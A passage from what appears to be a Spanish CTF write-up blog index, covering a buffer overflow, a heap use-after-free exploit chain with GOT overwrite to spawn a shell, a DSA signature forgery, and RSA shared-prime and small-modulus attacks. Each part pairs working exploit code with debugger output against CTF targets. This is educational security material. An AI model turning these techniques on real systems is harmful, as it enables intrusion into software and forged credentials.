60)')\\x86\\x85\\x04\\x08\" | nc thekidofarcrania.com 4902 Legend: buff MODIFIED padding MODIFIED notsecret MODIFIED secret MODIFIED return address MODIFIED 0xff856760 | 00 00 00 00 00 00 00 00 | 0xff856768 | 00 00 00 00 00 00 00 00 | 0xff856770 | 00 00 00 00 00 00 00 00 | 0xff856778 | 00 00 00 00 00 00 00 00 | 0xff856780 | ff ff ff ff ff ff ff ff | 0xff856788 | ff ff ff ff ff ff ff ff | 0xff856790 | c0 a5 f0 f7 00 a0 04 08 | 0xff856798 | a8 67 85 ff 8b 86 04 08 | Return address: 0x0804868b Input some text: Legend: buff MODIFIED padding MODIFIED notsecret MODIFIED secret MODIFIED return address MODIFIED 0xff856760 | 41 41 41 41 41 41 41 41 | 0xff856768 | 41 41 41 41 41 41 41 41 | 0xff856770 | 41 41 41 41 41 41 41 41 | 0xff856778 | 41 41 41 41 41 41 41 41 | 0xff856780 | 41 41 41 41 41 41 41 41 | 0xff856788 | 41 41 41 41 41 41 41 41 | 0xff856790 | 41 41 41 41 41 41 41 41 | 0xff856798 | 41 41 41 41 86 85 04 08 | Return address: 0x08048586 CTFlearn{c0ntr0ling_r1p_1s_n0t_t00_h4rd_abjkdlfa} timeout: the monitored command dumped core  ","image":"/images/pwn.png","permalink":"https://7rocky.github.io/ctf/ctflearn/binary/rip-my-bof/","section":"ctf","summary":"Binario de 32 bits. Buffer Overflow. Control del flujo de ejecución del programa","time":5,"title":"RIP my bof"},{"contents":"Se nos proporciona un binario de 64 bits llamado main:\nArch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000)  Nos dan un Dockerfile que comienza por FROM ubuntu:18.04, así que podemos coger Glibc desde el contenedor y usar pwninit para parchear el binario:\n$ docker run --rm -v \"$(pwd)\":/home/rocky -it ubuntu:18.04 bash root@c591782492e6:/# ldd /bin/sh linux-vdso.so.1 (0x00007ffde1fb3000) libc.so.6 =\u0026gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fbcde5ef000) /lib64/ld-linux-x86-64.so.2 (0x00007fbcdec00000) root@c591782492e6:/# /lib64/ld-linux-x86-64.so.2 /lib/x86_64-linux-gnu/libc.so.6 GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.6) stable release version 2.27. Copyright (C) 2018 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. Compiled by GNU CC version 7.5.0. libc ABIs: UNIQUE IFUNC For bug reporting instructions, please see: \u0026lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs\u0026gt;. root@c591782492e6:/# cp /lib64/ld-linux-x86-64.so.2 /lib/x86_64-linux-gnu/libc.so.6 /home/rocky root@c591782492e6:/# exit exit $ pwninit --libc libc.so.6 --ld ld-linux-x86-64.so.2 --bin main --no-template bin: main libc: libc.so.6 ld: ld-linux-x86-64.so.2 unstripping libc https://launchpad.net/ubuntu/+archive/primary/+files//libc6-dbg_2.27-3ubuntu1.6_amd64.deb copying mainto main_patched running patchelf on main_patched  Si abrimos el binario en Ghidra, veremos las siguientes funciones de un menú típico de explotación del heap:\nvoidrobots_factory() { intoption; puts(\"Welcome to the secret robots factory!\"); while(true) { menu(); option =read_int(); if(option ==4) break; if(option \u0026lt;5) { if(option ==3) { destroy_robot(); } elseif(option \u0026lt;4) { if(option ==1) { new_robot(); } elseif(option ==2) { program_robot(); } } } } } intmain() { setvbuf(stderr,NULL,2,0); setvbuf(stdout,NULL,2,0); setvbuf(stdin,NULL,2,0); robots_factory(); return0; }  Tenemos la posibilidad de crear robots:\nvoidnew_robot() { intsize; void*p_robot; longin_FS_OFFSET; inti; charsize_str[5]; longcanary;  canary =*(long*) (in_FS_OFFSET +0x28); if(number_robots \u0026lt;5) { puts(\"Provide robot memory size:\"); read(0, size_str, 4); size =atoi(size_str); if(size \u0026lt;0x101) { puts(\"you\\'re creating a stupid robot.\"); } else{ for(i =0; i \u0026lt;5; i++) { if(check_robot_slot[i] ==0) { p_robot =calloc(1, (long) size); robots[i] =p_robot; check_robot_slot[i] =1; robot_memory_size[i] =size; printf(\"You got new page at index %d\\n\", (ulong) (uint) i); number_robots =number_robots +1; break; } } } } else{ puts(\"All slots are occupied :(\"); } if(canary !=*(long*) (in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } }  Se nos pide introducir un tamaño mayor que 0x101 (257). Al crear el robot, el programa utiliza calloc. Esto es importante para la explotación ya que calloc no utiliza el Tcache.\nExisten algunos vectores y variables globales que almacenan metadatos de los robots (robots, robots_memory_size, check_robot_slot and number_robots). Además, solamente podemos crear hasta 5 robots.\nEsta es la función para programar un robot:\nvoidprogram_robot() { intindex; longin_FS_OFFSET; charindex_str[5]; longcanary;  canary =*(long*) (in_FS_OFFSET +0x28); puts(\"Provide robot\\'s slot:\"); read(0, index_str, 4); index =atoi(index_str); if((index \u0026lt;0) ||(4\u0026lt;index)) { puts(\"Slot is empty!\"); } elseif(robots[index] !=NULL) { puts(\"Program the robot:\"); read(0, robots[index], (long) robot_memory_size[index]); } if(canary !=*(long*) (in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } }  Lo primero que notamos es que podemos editar cualquier robot siempre que robot[index] != NULL. Vamos a echar un vistazo a destroy_robot:\nvoiddestroy_robot() { intindex; longin_FS_OFFSET; charindex_str[5]; longcanary;  canary =*(long*) (in_FS_OFFSET +0x28); puts(\"Provide robot\\'s slot:\"); read(0, index_str, 4); index =atoi(index_str); if((index \u0026lt;0) ||(4\u0026lt;index)) { puts(\"Slot is empty!\"); } elseif(check_robot_slot[index] ==0) { puts(\"robot doesn\\'t exist!\"); } else{ free(robots[index]); check_robot_slot[index] =0; number_robots =number_robots +-1; } if(canary !=*(long*) (in_FS_OFFSET +0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } }  Aquí el desarrollador se ha olvidado de borrar el puntero del robot destruido. El desarrollador solamente usa free, luego pone check_robot_slot[index] = 0 y reduce number_robots, pero robots[index] sigue disponible.\nEste hecho da lugar a una vulnerabilidad de Use After Free (UAF), ya que podemos programar un robot que ya está destruido. Vamos a planear la exploitación:\n Solamente podemos crear chunks de tamaño mayor que 0x101 (rangos de Small Bin y Large Bin) Como calloc no usa el Tcache, no podemos realizar un ataque de Tcache poisoning. Sin embargo, los chunks de menos de 0x401 bytes irán a la correspondiente lista del Tcache al ser liberados Podemos realizar un ataque de Unsorted Bin porque tenemos un UAF, por lo que podemos modificar el puntero bk y escribir un valor fijo en una dirección arbitraria Un buen objetivo para un ataque de Unsorted Bin es global_max_fast en Glibc. Esto hará que todos los chunks se comporten como Fast Bins (lo cual no era posible antes) Si conseguimos la habilidad de crear Fast Bins, podremos realizar un ataque de Fast Bin modificando el puntero fd de un chunk liberado, pero necesitaremos burlar algunas mitigaciones Un buen objetivo para un ataque de Fast Bin es la variable global robots, ya que podremos escribir direcciones de la Tabla de Offsets Globales (GOT) Como el binario tiene Partial RELRO, podremos realizar una sobrescritura de la GOT para fugar Glibc y llamar a system(\u0026quot;/bin/sh\u0026quot;)  Primero, vamos a comenzar creando dos chunks:\n Un chunk de tamaño 0x418 Otro chunk de tamaño 0x108 (para prevenir consolidación)  Al destruir el primer chunk obtendremos un Unsorted Bin y podremos modificar el puntero bk para que sea la dirección de global_max_fast:\ndefmain(): p=get_process() gdb.attach(p, 'continue') create(p, 0x418) create(p, 0x108) destroy(p, 0) p.interactive() if__name__=='__main__': main()  En GDB, vemos el siguiente estado del heap:\n$ python3 solve.py [*] './main_patched' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x3ff000) RUNPATH: b'.' [+] Starting local process './main_patched': pid 1686163 [*] running in new terminal: ['/usr/bin/gdb', '-q', './main_patched', '1686163', '-x', '/tmp/pwnrhgmk3pf.gdb'] [+] Waiting for debugger: Done [*] Switching to interactive mode 1- Create a robot 2- Program a robot 3- Destroy a robot 4- Exit \u0026gt; $  pwndbg\u0026gt; vis_heap_chunks 0x405000 0x0000000000000000 0x0000000000000251 ........Q....... 0x405010 0x0000000000000000 0x0000000000000000 ................ 0x405020 0x0000000000000000 0x0000000000000000 ................ ... 0x405230 0x0000000000000000 0x0000000000000000 ................ 0x405240 0x0000000000000000 0x0000000000000000 ................ 0x405250 0x0000000000000000 0x0000000000000421 ........!....... \u0026lt;-- unsortedbin[all][0] 0x405260 0x00007ffff7dcdca0 0x00007ffff7dcdca0 ................ 0x405270 0x0000000000000000 0x0000000000000000 ................ 0x405280 0x0000000000000000 0x0000000000000000 ................ ... 0x405650 0x0000000000000000 0x0000000000000000 ................ 0x405660 0x0000000000000000 0x0000000000000000 ................ 0x405670 0x0000000000000420 0x0000000000000110 ............... 0x405680 0x0000000000000000 0x0000000000000000 ................ 0x405690 0x0000000000000000 0x0000000000000000 ................ ... 0x405770 0x0000000000000000 0x0000000000000000 ................ 0x405780 0x0000000000000000 0x0000000000020881 ................ \u0026lt;-- Top chunk pwndbg\u0026gt; bins tcachebins empty fastbins 0x20: 0x0 0x30: 0x0 0x40: 0x0 0x50: 0x0 0x60: 0x0 0x70: 0x0 0x80: 0x0 unsortedbin all: 0x405250 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x405250 /* 'PR@' */ smallbins empty largebins empty pwndbg\u0026gt; p \u0026global_max_fast $1 = (size_t *) 0x7ffff7dcf940 \u0026lt;global_max_fast\u0026gt;  Ya tenemos el Unsorted Bin. Ahora, podemos modificar el puntero bk para que apunte a global_max_fast. De momento, deshabilitaré ASLR, y así solo tengo que sobrescribir los últimos dos bytes de bk con f940:\nprogram(p, 0, p64(0) +p16(0xf940-0x10)) create(p, 0x418) destroy(p, 0)  Ahora ya hemos modificado global_max_fast:\npwndbg\u0026gt; x/gx \u0026global_max_fast 0x7ffff7dcf940 \u0026lt;global_max_fast\u0026gt;: 0x00007ffff7dcdca0 pwndbg\u0026gt; bins tcachebins empty fastbins 0x20: 0x0 0x30: 0x0 0x40: 0x0 0x50: 0x0 0x60: 0x0 0x70: 0x0 0x80: 0x0 unsortedbin all[corrupted] FD: 0x405250 —▸ 0x7ffff7dcde40 (main_arena+512) ◂— 0x405250 /* 'PR@' */ BK: 0x7ffff7dcf930 (dumped_main_arena_end) ◂— 0x0 smallbins 0x1b0[corrupted] FD: 0x405250 —▸ 0x7ffff7dcde40 (main_arena+512) ◂— 0x405250 /* 'PR@' */ BK: 0x7ffff7dcde40 (main_arena+512) ◂— 0x7ffff7dcde40 largebins empty  Sin embargo, como desventaja, hemos corrompido la lista enlazada de Unsorted Bin, y si creamos un nuevo chunk el programa se romperá:\n\u0026gt; $ 1 Provide robot memory size: $ 264 malloc(): memory corruption (fast)  ¿Pero ves algo extraño? Hemos creado un chunk de tamaño 0x108 (264), y se está considerando como Fast Bin. Por tanto, hemos modificado global_max_fast correctamente.\nPodemos arreglar el problema creando un chunk adicional antes de realizar el ataque de Unsorted Bin. Luego, podemos liberar ese chunk para insertarlo en el Fast Bin y modificar su puntero fd. No obstante, tenemos que cumplir ciertas restricciones:\n La dirección tiene que contener un tamaño válido para el chunk que estamos \u0026ldquo;restaurando\u0026rdquo; El campo que corresponde al tamaño anterior tiene que coincidir con el tamaño del chunk anterior  Si miramos en robot_memory_size, veremos lo siguiente:\npwndbg\u0026gt; x/30gx \u0026robot_memory_size 0x4040c0 \u0026lt;robot_memory_size\u0026gt;: 0x0000010800000418 0x0000000000000000 0x4040d0 \u0026lt;robot_memory_size+16\u0026gt;: 0x0000000000000000 0x0000000000000000 0x4040e0 \u0026lt;check_robot_slot\u0026gt;: 0x0000000100000000 0x0000000000000000 0x4040f0 \u0026lt;check_robot_slot+16\u0026gt;: 0x0000000000000000 0x0000000000000000 0x404100 \u0026lt;robots\u0026gt;: 0x0000000000405260 0x0000000000405680 0x404110 \u0026lt;robots+16\u0026gt;: 0x0000000000000000 0x0000000000000000 0x404120 \u0026lt;robots+32\u0026gt;: 0x0000000000000000 0x0000000000000001 0x404130: 0x0000000000000000 0x0000000000000000 0x404140: 0x0000000000000000 0x0000000000000000 0x404150: 0x0000000000000000 0x0000000000000000 0x404160: 0x0000000000000000 0x0000000000000000 0x404170: 0x0000000000000000 0x0000000000000000 0x404180: 0x0000000000000000 0x0000000000000000 0x404190: 0x0000000000000000 0x0000000000000000 0x4041a0: 0x0000000000000000 0x0000000000000000  De hecho, si creamos un tercer chunk, el tamaño se almacenará en robot_memory_size, y el campo de tamaño anterior será 0x418. Por tanto, podemos crear dos chunks de tamaño 0x418 y el tercero de tamaño 0x421, que actuará como barrera para prevenir la consolidación del heap y además será útil para pasar la comprobación de Fast Bin:\ndefmain(): p=get_process() gdb.attach(p, 'continue') create(p, 0x418) create(p, 0x418) create(p, 0x421) destroy(p, 0) program(p, 0, p64(0) +p16(0xf940-0x10)) create(p, 0x418) destroy(p, 0) p.interactive() if__name__=='__main__': main()  pwndbg\u0026gt; x/30gx \u0026robot_memory_size 0x4040c0 \u0026lt;robot_memory_size\u0026gt;: 0x0000041800000418 0x0000000000000421 0x4040d0 \u0026lt;robot_memory_size+16\u0026gt;: 0x0000000000000000 0x0000000000000000 0x4040e0 \u0026lt;check_robot_slot\u0026gt;: 0x0000000100000000 0x0000000000000001 0x4040f0 \u0026lt;check_robot_slot+16\u0026gt;: 0x0000000000000000 0x0000000000000000 0x404100 \u0026lt;robots\u0026gt;: 0x0000000000405260 0x0000000000405680 0x404110 \u0026lt;robots+16\u0026gt;: 0x0000000000405aa0 0x0000000000000000 0x404120 \u0026lt;robots+32\u0026gt;: 0x0000000000000000 0x0000000000000002 0x404130: 0x0000000000000000 0x0000000000000000 0x404140: 0x0000000000000000 0x0000000000000000 0x404150: 0x0000000000000000 0x0000000000000000 0x404160: 0x0000000000000000 0x0000000000000000 0x404170: 0x0000000000000000 0x0000000000000000 0x404180: 0x0000000000000000 0x0000000000000000 0x404190: 0x0000000000000000 0x0000000000000000 0x4041a0: 0x0000000000000000 0x0000000000000000 pwndbg\u0026gt; heap Allocated chunk | PREV_INUSE Addr: 0x405000 Size: 0x251 Free chunk (unsortedbin) | PREV_INUSE Addr: 0x405250 Size: 0x421 fd: 0x7ffff7dcde40 bk: 0x00 Allocated chunk | PREV_INUSE Addr: 0x405670 Size: 0x421 Allocated chunk | PREV_INUSE Addr: 0x405a90 Size: 0x431 Top chunk | PREV_INUSE Addr: 0x405ec0 Size: 0x20141  Esto es a lo que me refería. Tenemos un Fast Bin en el índice 1, ahora lo liberaremos y modificaremos su puntero fd a robot_memory_size. Pasaremos la comprobación del tamaño porque tenemos 0x421 en esa dirección, y el campo de tamaño anterior será 0x418, que coincide con el chunk anterior en el heap. Entonces todo funcionará bien:\ndestroy(p, 1) program(p, 1, p64(elf.sym.robot_memory_size)) create(p, 0x418) create(p, 0x418)  pwndbg\u0026gt; x/30gx \u0026robot_memory_size 0x4040c0 \u0026lt;robot_memory_size\u0026gt;: 0x0000041800000418 0x0000000000000421 0x4040d0 \u0026lt;robot_memory_size+16\u0026gt;: 0x0000000000000000 0x0000000000000000 0x4040e0 \u0026lt;check_robot_slot\u0026gt;: 0x0000000100000000 0x0000000000000000 0x4040f0 \u0026lt;check_robot_slot+16\u0026gt;: 0x0000000000000000 0x0000000000000000 0x404100 \u0026lt;robots\u0026gt;: 0x0000000000000000 0x00000000004040d0 0x404110 \u0026lt;robots+16\u0026gt;: 0x0000000000000000 0x0000000000000000 0x404120 \u0026lt;robots+32\u0026gt;: 0x0000000000000000 0x0000000000000001 0x404130: 0x0000000000000000 0x0000000000000000 0x404140: 0x0000000000000000 0x0000000000000000 0x404150: 0x0000000000000000 0x0000000000000000 0x404160: 0x0000000000000000 0x0000000000000000 0x404170: 0x0000000000000000 0x0000000000000000 0x404180: 0x0000000000000000 0x0000000000000000 0x404190: 0x0000000000000000 0x0000000000000000 0x4041a0: 0x0000000000000000 0x0000000000000000  En este punto, tenemos robots[1] apuntando a 0x4040d0, por lo que podemos comenzar a jugar con estas variables globales y poner los valores que queramos. Por ejemplo, podemos poner un 1 en check_robot_slot y poner entradas de la GOT en robots:\nprogram(p, 1, p64(0x1000) +p64(0) +p32(1) *5+p64(0) +p32(0) + p64(elf.got.free) +p64(elf.got.atoi) +p64(elf.got.atoi))  Con esto, podemos modificar la entrada de free en la GOT para que sea puts, de manera que podemos fugar atoi en Glibc en tiempo de ejecución al usar destroy(p, 2):\nprogram(p, 0, p64(elf.plt.puts)) destroy(p, 2) atoi_addr=u64(p.recvline().strip().ljust(8, b'\\0')) glibc.address=atoi_addr-glibc.sym.atoi log.success(f'Glibc base address: {hex(glibc.address)}')  $ python3 solve.py [*] './main_patched' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x3ff000) RUNPATH: b'.' [+] Starting local process './main_patched': pid 1712644 [*] running in new terminal: ['/usr/bin/gdb', '-q', './main_patched', '1712644', '-x', '/tmp/pwn_ozbkaaz.gdb'] [+] Waiting for debugger: Done [+] Glibc base address: 0x7ffff79e2000 [*] Switching to interactive mode 1- Create a robot 2- Program a robot 3- Destroy a robot 4- Exit \u0026gt; $  Genial, tenemos una fuga de Glibc. Ahora podemos modificar la GOT de nuevo y hacer que atoi sea system, de forma que, en lugar de introducir un número del menú, pongamos sh para conseguir una shell (solo podemos escribir hasta 4 bytes, por lo que sh es suficiente):\nprogram(p, 1, p64(glibc.sym.system)) p.sendlineafter(b'\u0026gt; ', b'sh') p.interactive()  $ python3 solve.py [*] './main_patched' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x3ff000) RUNPATH: b'.' [+] Starting local process './main_patched': pid 1714210 [+] Glibc base address: 0x7ffff79e2000 [*] Switching to interactive mode $ ls ld-linux-x86-64.so.2 libc.so.6 main main_patched solve.py  Genial. Lo único que falta es habilitar ASLR. Esto hará que el exploit funcione de media 1 de cada 16 veces, debido a que estamos modificando global_max_fast de forma parcial con dos bytes, y ASLR afecta a uno de los dígitos hexadecimales involucrados (4 bits):\n$ while true; do python3 solve.py 2\u0026gt;/dev/null; done [*] './main_patched' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x3ff000) RUNPATH: b'.' [+] Starting local process './main_patched': pid 1719491 [*] Process './main_patched' stopped with exit code -11 (SIGSEGV) (pid 1719491) [*] './main_patched' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x3ff000) RUNPATH: b'.' [+] Starting local process './main_patched': pid 1719497 [*] Process './main_patched' stopped with exit code -11 (SIGSEGV) (pid 1719497) ... [*] './main_patched' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x3ff000) RUNPATH: b'.' [+] Starting local process './main_patched': pid 1719600 [*] Process './main_patched' stopped with exit code -11 (SIGSEGV) (pid 1719600) [*] './main_patched' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x3ff000) RUNPATH: b'.' [+] Starting local process './main_patched': pid 1719606 [+] Glibc base address: 0x7f3744bd2000 [*] Switching to interactive mode $ ls ld-linux-x86-64.so.2 libc.so.6 main main_patched solve.py  El exploit completo se puede encontrar aquí: solve.py.\n","image":"/images/pwn.png","permalink":"https://7rocky.github.io/ctf/other/robot-factory/","section":"ctf","summary":"BlackHat MEA CTF 2022. Binario de 64 bits. Explotación del heap. Ataque de Unsorted Bin. Ataque de Fast Bin. Sobres ritura de la GOT","time":8,"title":"Robot Factory"},{"contents":"Se nos proporciona el código fuente de un servidor que ejecuta un Algoritmo de Firma Digital (DSA, Digital Signature Algorithm):\nfromCrypto.Util.numberimportgetPrime, isPrime, inverse fromhashlibimportsha256 fromrandomimportrandrange q, g=0, 2 whilenotisPrime(p:=2*q+1) orpow(g, q, p) !=1: q=getPrime(256) x=randrange(2, q) y=pow(g, x, p) defH(m): returnint.from_bytes(sha256(m).digest(), 'big') defsign(m): k=randrange(2, q) r=pow(g, k, p) %q s=(H(m) +r*x) *inverse(k, q) %q returnr, s defverify(m, r, s): u=inverse(s, q) returnpow(g, u*H(m), p) *pow(y, u*r, p) %p%q==r defmain(): print(\"Hello admin, here are the parameters!\") print('p =', p) print('y =', y) print(\"Please sign a message to retrieve your flag:\") m=bytes.fromhex(input('m = ')) r=int(input('r = ')) s=int(input('s = ')) ifnotverify(m, r, s): print(\"I've called the cops!\") exit() ifm!=b\"I'm the admin and I'd like to get my flag.\": print(\"Who are you??\") exit() print(\"Verification successful! Here is your flag: \", end='') withopen('flag.txt', 'r') asfile: print(file.read(), flush=True) if__name__=='__main__': main()  Solamente podemos introducir mensajes $m$ con su correspondiente firma $(r, s)$. Sin embargo, no podemos obtener una firma válida $(r, s)$ porque no tenemos la clave privada $x$.\nLa implementación de DSA es correcta salvo por el uso de la función inverse de Crypto.Util.number. De hecho, inverse(0, q) e inverse(q, q) devuelven 0, que es matemáticamente incorrecto ya que $0^{-1} \\pmod{q}$ no está definido ($0$ no pertenece a $Z_q^*$, el grupo multiplicativo módulo $q$):\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; from Crypto.Util.number import inverse \u0026gt;\u0026gt;\u0026gt; q = 17 \u0026gt;\u0026gt;\u0026gt; inverse(0, q) 0 \u0026gt;\u0026gt;\u0026gt; inverse(q, q) 0 \u0026gt;\u0026gt;\u0026gt; pow(0, -1, q) Traceback (most recent call last): File \"\u0026lt;stdin\u0026gt;\", line 1, in \u0026lt;module\u0026gt; ValueError: base is not invertible for the given modulus \u0026gt;\u0026gt;\u0026gt; pow(q, -1, q) Traceback (most recent call last): File \"\u0026lt;stdin\u0026gt;\", line 1, in \u0026lt;module\u0026gt; ValueError: base is not invertible for the given modulus  Con este problema de inverse (en lugar de usar la función pow), podemos hacer que s = 0 de manera que:\n u = inverse(s, q) = 0 Luego pow(g, u * H(m), p) es pow(g, 0, p) = 1 Y también pow(y, u * r, p) es pow(y, 0, p) = 1 Por tanto, pow(g, u * H(m), p) * pow(y, u * r, p) % p % q = 1  Y entonces, tenemos que mandar r = 1.\nPara obtener la flag, tenemos que enviar el mensaje \u0026quot;I'm the admin and I'd like to get my flag.\u0026quot; en formato hexadecimal. Vamos a hacerlo:\n$ echo -n \"I'm the admin and I'd like to get my flag.\" | xxd -p | tr -d \\\\n 49276d207468652061646d696e20616e6420492764206c696b6520746f20676574206d7920666c61672e $ nc 031337.xyz 42050 Hello admin, here are the parameters! p = 130075297914599005878561792472990971963858978284996116362111109771454513001167 y = 84075133818892653193774942063986755752314541683015608384614923289226921999657 Please sign a message to retrieve your flag: m = 49276d207468652061646d696e20616e6420492764206c696b6520746f20676574206d7920666c61672e r = 1 s = 0 Verification successful! Here is your flag: ictf{TH15_I5_TH3_R34S0N}  ","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/ctf/imaginaryctf/rolled-my-own-crypto/","section":"ctf","summary":"ImaginaryCTF 04/09/2022. 90 puntos. DSA. Abusando de valores especiales","time":2,"title":"Rolled my own Crypto"},{"contents":"Se nos da un socket al que conectarnos. Al realizar la conexión se muestra el código fuente usado para cifrar la flag:\n$ nc puzzler7.imaginaryctf.org 3000 ================================================================================  #!/usr/bin/env python3 fromCrypto.Util.numberimport* classRotator: QUEUE_LENGTH=10 def__init__(self): self.e=65537 self.m=bytes_to_long(open('flag.txt', 'rb').read()) self.queue=[getPrime(512) foriinrange(self.QUEUE_LENGTH)] defget_new_primes(self): ret=self.queue[-2:] self.queue.pop() while(len(self.queue) \u0026lt;self.QUEUE_LENGTH): self.queue=[getPrime(512)] +self.queue returntuple(ret) defenc_flag(self): p, q=self.get_new_primes() n=p*q print(f\"Public key: {(n, self.e)}\") print(f\"Your encrypted flag: {pow(self.m, self.e, n)}\") rot=Rotator() print('='*80) print(open(__file__).read()) print('='*80) whileTrue: inp=input(\"Would you like an encrypted flag (y/n)? \") if'y'ininp.lower(): rot.enc_flag() print() else: break  ================================================================================ Would you like an encrypted flag (y/n)? ^C  El criptosistema utilizado es RSA, pero la implementación es errónea. La manera de obtener los dos números primos $p$ y $q$ es usando una lista de 10 número primos. El problema es que utiliza los primos #9 y #10, elimina el último primo de la lista y añade otro al principio.\nPor tanto, si ciframos la flag otra vez, los números primos #9 y #10 son los antiguos #8 y #9. Entonces, los dos módulos $n_1$ y $n_2$ tienen un factor primo en común, por lo que lo podemos calcular mediante el Máximo Común Divisor (Greatest Common Divisor, GCD):\n$ nc puzzler7.imaginaryctf.org 3000 ================================================================================ ... ================================================================================ Would you like an encrypted flag (y/n)? y Public key: (96703909946448187810080059928860289847334838421345682013476154093401516765135280790240748288018738898773300957888698818329609720254183468520955600410824182661260651475354846583794678409061342257380126990919258631778574644009046899146628324485287628710454832937953442848153274308105256237934059406671514368669, 65537) Your encrypted flag: 59178952773280983701929213365655160414345333604813929581573406427317973306869828507777582501496996849288063597376183280909545034065032431890181707370065107503683394760116243008932175061294230315842811989143511271380367848125619781509436529057342192685755008501371415788491821709728063365374407957399759308403 Would you like an encrypted flag (y/n)? y Public key: (67521112267846681759399501276451660075611114138321414686289669627378193951857898222612601048796706669289048949898237532495727093603797701087528981834411985551974275328675230434122883600996218065032476293749234911283805641424141314863236316629221906963122154907092242556815579427166899630607780645315510611627, 65537) Your encrypted flag: 17472971162377108034479702090513254186993682961319105294905663470809265628036722391463644486154580853360833837492388701203988503690522100670413712708369683451190130374033333827066594624190360243317258296768874842826927768445323829689267057977209895049163051260509473831629782589375685789931957272431150099185 Would you like an encrypted flag (y/n)? ^C  $ python3 -q \u0026gt;\u0026gt;\u0026gt; import math \u0026gt;\u0026gt;\u0026gt; math.gcd( ... 96703909946448187810080059928860289847334838421345682013476154093401516765135280790240748288018738898773300957888698818329609720254183468520955600410824182661260651475354846583794678409061342257380126990919258631778574644009046899146628324485287628710454832937953442848153274308105256237934059406671514368669, ... 67521112267846681759399501276451660075611114138321414686289669627378193951857898222612601048796706669289048949898237532495727093603797701087528981834411985551974275328675230434122883600996218065032476293749234911283805641424141314863236316629221906963122154907092242556815579427166899630607780645315510611627 ... ) 9363717537480322078371747028261742962030931062610359488017319347844327325330269179209776316998302502579512167515356510999614768902498349936434046242471613  Y ahí está. Ahora que tenemos un número primo, podemos encontrar el otro usando la división entera sobre $n_1$ y descifrar el cifrado RSA de la manerahabitual. Este es el script en Python que soluciona el reto:\n#!/usr/bin/env python3 frommathimportgcd frompwnimportremote defmain(): r=remote('puzzler7.imaginaryctf.org', 3000) r.sendlineafter(b'Would you like an encrypted flag (y/n)? ', b'y') r.recvuntil(b'Public key: ') n1, e =eval(r.recvline().decode()) r.recvuntil(b'Your encrypted flag: ') c =int(r.recvline().decode()) r.sendlineafter(b'Would you like an encrypted flag (y/n)? ', b'y') r.recvuntil(b'Public key: ') n2, _=eval(r.recvline().decode()) r.close() p=gcd(n1, n2) q=n1//p phi_n=(p-1) *(q-1) d=pow(e, -1, phi_n) m=pow(c, d, n1) print(bytes.fromhex(hex(m)[2:]).decode()) if__name__=='__main__': main()  Y obtenemos la flag:\n$ python3 solve.py [+] Opening connection to puzzler7.imaginaryctf.org on port 3000: Done [*] Closed connection to puzzler7.imaginaryctf.org port 3000 ictf{why_would_I_throw_away_perfectly_good_primes?}  El script completo se puede encontrar aquí: solve.py.\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/ctf/imaginaryctf/rotating-secret-assembler/","section":"ctf","summary":"ImaginaryCTF 05/07/2022. 50 puntos. RSA. Máximo Común Divisor","time":1,"title":"Rotating Secret Assembler"},{"contents":"Se nos proporcionan estos números:\ne: 3 c: 174422460809195453539354885823735245900172562989776845322302 n: 245841236512478852752909734912575581815967630033049838269083  Tenemos el exponente $e$, el módulo $n$ y el texto cifrado $c$.\nEstá claro que estamos ante un criptosistema RSA. Vamos a recordar cómo funciona RSA:\nSe eligen dos números primos $p$ y $q$ de forma que el módulo $n = p \\cdot q$. Luego se escoge un exponente $e$ (normalmente 3 ó 65537) que sea coprimo con $\\phi(n) = (p - 1) \\cdot (q - 1)$.\nPara cifrar un mensaje $m$ (en formato numérico), se tiene que realizar esta operación:\n$$ c = m ^ e \\pmod{n} $$\nDonde $c$ es el texto cifrado. Y para descifrar el texto cifrado, tenemos que calcular $d = e ^ {-1} \\pmod{\\phi(n)}$ y luego realizar la siguiente operación:\n$$ m = c ^ d \\pmod{n} $$\nEn este punto, la clave pública es el conjunto ${e, n}$, mientras que la clave privada está compuesta por ${p, q}$.\nEl criptosistema RSA será robusto en función de la dificultad para factorizar el módulo $n$. Si se pudiera factorizar, se podrían obtener $p$ y $q$ a partir de $n$ y por tanto calcular $\\phi(n)$ y $d$.\nEsta vez, el ódulo $n$ que tenemos es relativamente pequeño, por lo que podremos factorizarlo. Para ello, podemos ir a factordb.com e introducir el módulo:\nY ahora que tenemos $p$ y $q$, podemos usar Python para calcular $\\phi(n)$ y $d$. Y finalmente hallar el mensaje $m$:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; e = 3 \u0026gt;\u0026gt;\u0026gt; c = 174422460809195453539354885823735245900172562989776845322302 \u0026gt;\u0026gt;\u0026gt; n = 245841236512478852752909734912575581815967630033049838269083 \u0026gt;\u0026gt;\u0026gt; p = 416064700201658306196320137931 \u0026gt;\u0026gt;\u0026gt; q = 590872612825179551336102196593 \u0026gt;\u0026gt;\u0026gt; phi_n = (p - 1) * (q - 1) \u0026gt;\u0026gt;\u0026gt; d = pow(e, -1, phi_n) \u0026gt;\u0026gt;\u0026gt; m = pow(c, d, n) \u0026gt;\u0026gt;\u0026gt; hex(m) 